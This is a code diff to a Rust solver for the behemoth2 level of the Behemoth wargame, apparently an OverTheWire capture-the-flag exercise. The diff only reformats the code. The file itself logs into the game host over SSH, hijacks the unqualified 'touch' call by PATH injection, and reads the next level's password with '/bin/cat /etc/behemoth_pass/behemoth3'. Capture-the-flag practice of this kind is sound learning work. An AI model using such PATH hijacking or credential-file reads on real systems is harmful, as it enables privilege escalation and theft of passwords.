@@ -1,10 +1,9 @@
-use anyhow::Result;
 use crate::util::*;
+use anyhow::Result;
 
 /// behemoth2 calls 'touch' unqualified to create a file with the name of its PID. it then waits two seconds before executing the file's contents
 /// while this could be exploited by perhaps writing some command into the file (once the pid is determined), it is simpler to hijack touch via path injection
 pub fn solve(password: &str) -> Result<String> {
-
     let session = ssh_session(super::HOST, super::PORT, "behemoth2", password)?;
 
     let mut channel = session.channel_session()?;
@@ -25,8 +24,8 @@ pub fn solve(password: &str) -> Result<String> {
     write_line(&mut channel, "/bin/cat /etc/behemoth_pass/behemoth3")?; // note because we murdered PATH, we need to use the qualified path to 'cat' to call it
     let result = read_until(&mut channel, "$ ")?;
     let result: Vec<&str> = result.split("\n").collect();
-    let result = result[result.len()-2].trim();
-    
+    let result = result[result.len() - 2].trim();
+
     println!("retrieved behemoth3 pass '{result}'\n");
 
     Ok(result.to_string())
